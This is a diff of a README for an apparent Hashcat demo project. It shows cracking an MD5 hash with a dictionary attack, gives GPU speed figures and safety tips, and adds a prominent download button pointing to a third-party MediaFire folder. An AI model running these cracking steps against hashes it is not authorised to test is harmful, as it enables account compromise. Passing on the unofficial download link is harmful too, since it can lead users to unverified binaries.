@@ -6,13 +6,29 @@
 
 <p align="center">
   <a href="https://www.mediafire.com/folder/8vkutyqghuno2/Hashcat">
-    <img src="https://img.shields.io/badge/⚡ DOWNLOAD HASHCAT-GPU POWER-00ff9c?style=for-the-badge&logo=databricks&logoColor=black" />
+    <img src="https://img.shields.io/badge/⚡%20DOWNLOAD%20NOW-HASHCAT%20GPU-00ff9c?style=for-the-badge&logo=databricks&logoColor=black&labelColor=000000" />
   </a>
 </p>
 
 ---
 
-## ⚡ Live Demo (Realistic Terminal Animation)
+## 🎥 Watch Full Video
+
+<p align="center">
+  <a href="https://www.youtube.com/watch?v=9AY3EbMQLKI">
+    <img src="https://img.youtube.com/vi/9AY3EbMQLKI/maxresdefault.jpg" width="800" />
+  </a>
+</p>
+
+<p align="center">
+  <a href="https://www.youtube.com/watch?v=9AY3EbMQLKI">
+    <img src="https://img.shields.io/badge/▶%20WATCH%20ON%20YOUTUBE-red?style=for-the-badge&logo=youtube" />
+  </a>
+</p>
+
+---
+
+## ⚡ Live Demo (Terminal Animation)
 
 <p align="center">
   <img src="./hashcat_demo.gif" width="800" />
@@ -22,35 +38,35 @@
 
 ## 🚀 Overview
 
-This project shows how a **weak password can be cracked in seconds** using GPU acceleration with Hashcat.
+This project demonstrates how a **weak password can be cracked in seconds** using GPU acceleration.
 
-💥 Real takeaway: speed + bad password = instant compromise
+💥 If your password is weak — it's already gone.
 
-⚠️ For **educational and ethical testing only**.
+⚠️ Educational purposes only.
 
 ---
 
 ## 🧠 What You'll Learn
 
-* How password hashing actually works
-* Why most passwords are brutally insecure
-* How GPUs destroy brute-force time
-* Real-world cracking workflow
-* How to fully protect yourself
+* How hashing works
+* Why passwords get cracked fast
+* GPU vs CPU difference
+* Real attack workflow
+* How to protect yourself
 
 ---
 
 ## 🖥️ Setup
 
-### 1. Install / Download
-
-Use the button above or:
+### Install Hashcat
 
 ```bash
 sudo apt install hashcat
 ```
 
-### 2. Verify GPU
+Or download using the button above.
+
+### Check GPU
 
 ```bash
 hashcat -I
@@ -64,35 +80,22 @@ hashcat -I
 5f4dcc3b5aa765d61d8327deb882cf99
 ```
 
-👉 This is a weak MD5 hash (very common in leaks)
-
 ---
 
-## ⚡ Cracking Command
+## ⚡ Crack Command
 
 ```bash
 hashcat -m 0 -a 0 hash.txt rockyou.txt
 ```
 
-### 🔍 Breakdown
-
-| Flag          | Meaning           |
-| ------------- | ----------------- |
-| `-m 0`        | MD5               |
-| `-a 0`        | Dictionary attack |
-| `hash.txt`    | Target            |
-| `rockyou.txt` | Wordlist          |
-
 ---
 
-## 🚀 GPU vs CPU Reality
+## 🚀 Performance
 
 | Device | Speed         |
 | ------ | ------------- |
 | CPU    | ~50 MH/s      |
 | GPU    | ~10,000+ MH/s |
-
-💀 GPUs = instant destruction of weak passwords
 
 ---
 
@@ -103,21 +106,19 @@ Password FOUND: password
 Time: < 1 second
 ```
 
-Yes... it was that easy.
-
 ---
 
-## 🛡️ How To Stay Safe
+## 🛡️ Stay Safe
 
-* Use 12–16+ character passwords
-* Avoid dictionary words
+* Use long passwords (12+ chars)
+* Avoid common words
+* Enable 2FA
 * Use password manager
-* Enable 2FA everywhere
-* Prefer bcrypt / argon2
+* Use bcrypt / argon2
 
 ---
 
-## 📁 Project Structure
+## 📁 Structure
 
 ```bash
 .
@@ -130,24 +131,14 @@ Yes... it was that easy.
 
 ---
 
-## 🎥 Video
-
-👉 Add your YouTube video here
-
----
-
 ## ⚠️ Disclaimer
 
-This repository is strictly for:
+For educational use only.
 
-* Security research
-* Ethical hacking
-* Education
-
-❌ Do NOT use on systems without permission
+Do NOT use without permission.
 
 ---
 
 ## ⭐ Support
 
-If this helped you — drop a ⭐ and share 🚀
+Star the repo if you found it useful 🚀
